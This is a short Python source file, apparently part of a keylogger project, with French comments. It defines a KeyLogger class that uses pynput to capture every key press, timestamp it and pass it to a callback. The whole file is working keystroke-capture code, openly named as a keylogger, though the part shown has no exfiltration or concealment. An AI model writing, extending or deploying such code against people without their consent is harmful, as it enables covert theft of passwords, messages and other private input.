# keylogger/keylogger.py

import logging
from datetime import datetime
from pynput import keyboard

class KeyLogger:
    def __init__(self, callback):
        """
        KeyLogger simple basé sur pynput, qui invoque un callback à chaque touche.
        """
        self.callback = callback
        self.running = True
        self.listener = None

    def start(self):
        if not self.listener or not self.listener.is_alive():
            self.running = True
            self.listener = keyboard.Listener(on_press=self._on_key_press)
            self.listener.start()
            logging.info("Keylogger démarré.")

    def stop(self):
        self.running = False
        if self.listener and self.listener.is_alive():
            self.listener.stop()
            logging.info("Keylogger arrêté.")

    def _on_key_press(self, key):
        if not self.running:
            return
        try:
            key_text = str(key)
            if key_text.startswith("Key."):
                key_text = f"[{key_text.split('.')[1]}]"
            else:
                key_text = key_text.strip("'")
        except Exception as e:
            key_text = "[Touche spéciale]"
            logging.error(f"Erreur lors du traitement de la touche: {e}")

        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        self.callback(f"{timestamp}: {key_text}")
